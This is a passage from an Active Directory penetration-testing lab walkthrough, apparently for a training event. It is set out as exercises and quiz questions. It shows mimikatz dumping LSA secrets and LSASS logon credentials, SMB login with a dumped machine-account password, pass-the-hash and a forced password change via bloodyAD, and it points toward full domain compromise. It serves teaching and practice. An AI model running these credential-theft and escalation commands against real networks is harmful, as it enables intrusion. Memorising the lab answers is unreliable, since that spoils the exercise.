cur/hex : 01 00 00 00 07 db b0 f2 fa c4 68 55 08 5d 00 b6 dd 90 59 9f 66 32 87 1e 17 dd 6b ac b3 eb f1 33 6e 21 f4 da 27 ad 97 0b 1d 12 49 77
    full: 07dbb0f2fac46855085d00b6dd90599f6632871e17dd6bacb3ebf1336e21f4da27ad970b1d124977
    m/u : 07dbb0f2fac46855085d00b6dd90599f6632871e / 17dd6bacb3ebf1336e21f4da27ad970b1d124977
old/hex : 01 00 00 00 25 cb 73 ee ff 01 2d 45 29 62 5b e4 1a 33 29 67 97 bb 10 03 b5 b5 c8 90 85 d1 b2 c3 8a 56 24 b2 40 f0 d5 8c fa cb 28 0d
    full: 25cb73eeff012d4529625be41a33296797bb1003b5b5c89085d1b2c38a5624b240f0d58cfacb280d
    m/u : 25cb73eeff012d4529625be41a33296797bb1003 / b5b5c89085d1b2c38a5624b240f0d58cfacb280d

Secret  : NL$KM
cur/hex : ad a8 78 92 30 dd 2f 08 f7 24 fe 41 72 7a ef 38 6d 38 22 98 93 61 4a d9 78 78 ba 5c 25 af 86 a7 3b fe 57 bb 43 8a 36 b2 6b 6f 95 13 1b a8 f2 64 48 3f 55 7a b4 7c a4 ff 16 60 c3 24 45 18 ac ad
old/hex : ad a8 78 92 30 dd 2f 08 f7 24 fe 41 72 7a ef 38 6d 38 22 98 93 61 4a d9 78 78 ba 5c 25 af 86 a7 3b fe 57 bb 43 8a 36 b2 6b 6f 95 13 1b a8 f2 64 48 3f 55 7a b4 7c a4 ff 16 60 c3 24 45 18 ac ad

mimikatz(commandline) # exit
Bye!
```

The password located at `$MACHINE.ACC` is the actual password of the machine's domain account: `FS$`, that can be used for domain authentication.

```
┌──(kali㉿kali)-[~/sincon]
└─$ nxc smb dc.async.local -u 'FS$' -p pass
SMB         10.2.10.2       445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:async.local) (signing:True) (SMBv1:False) 
SMB         10.2.10.2       445    DC               [+] async.local\FS$:,rgG(wIv=bliUW%`_Y:Tb!m`ss.wHI=m/UD[Q*ljJcF&Rf75:tIyZeJ"OjcZD>5KCF&8a7M(uIg2sqtdsn1kexkb]^&.23BTA]H'vXn[K?[v$l4w3-W7b4&%
```

Similar to the local administrator, this password also regularly rotates so it may not be valid for long.

### 4.4. LSASS

Dumping LSASS is by far the most common TTP (Tactics, Techniques, and Procedures) used to obtain credentials from a machine. This is because LSASS stores the credentials of all users that have logged into the machine, including domain users.

Due to the nature of credential caching, if an interactive logon occurs on a machine, the credentials are stored in LSASS until the next reboot. This usually means that LSASS will almost always contain sensitive credentials.

```
*Evil-WinRM* PS C:\windows\tasks> .\mimikatz.exe "token::elevate" "sekurlsa::logonpasswords" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

720     {0;000003e7} 1 D 33311          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;3feaf4af} 0 D 1072418470  async\Tyler_ROSE        S-1-5-21-2085372437-1578838935-3393986013-1372  (11g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 1072526991  NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 43039108 (00000000:0290b984)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/29/2025 12:31:38 AM
SID               : S-1-5-90-0-2

...
```

**Q18**: What is the NTLM hash of the `Austin_BROOKS` user?

## Exercise 5: Privilege Escalation

With the credentials of `Austin_BROOKS`, we can now enumerate the domain for access controls that they have.

```
bloodyAD --host 'dc.async.local' -u 'Austin_BROOKS' -p ':3a7b6510f7ba73bf0171dd258a01234d' get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=async,DC=local
permission: WRITE

distinguishedName: CN=Austin_BROOKS,CN=Users,DC=async,DC=local
permission: WRITE

[..snip..]
```

**Q19**: `Austin_BROOKS` has the `GenericAll` permission on which user? (omit the suffix number)

### 5.1. GenericAll

```
distinguishedName: CN=svc_async-1,CN=Users,DC=async,DC=local
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE
```

As `Austin_BROOKS` has the ability to write and modify all properties of `svc_async-X`, they can simply modify the password of the account. This is a primtive known as "ForceChangePassword".

```
bloodyAD --host 'dc.async.local' -u 'Austin_BROOKS' -p ':3a7b6510f7ba73bf0171dd258a01234d' set password svc_async-1 'P@ssw0rd'
[+] Password changed successfully!
```

There is another way to compromise `svc_async-1` with these primitives, without forcibly changing their password. This is done using Active Directory Certificate Services (ADCS) via the Shadow Credentials attribute, this is an extra-mile - EM5.

## Exercise 6: Domain Dominance

Using `svc_async-1`, they can perform an attack that allows for the compromise of the entire domain. Enumerate it, and perform the attack to compromise the domain.

**Q20**: What is the NTLM hash of the `Admin` user?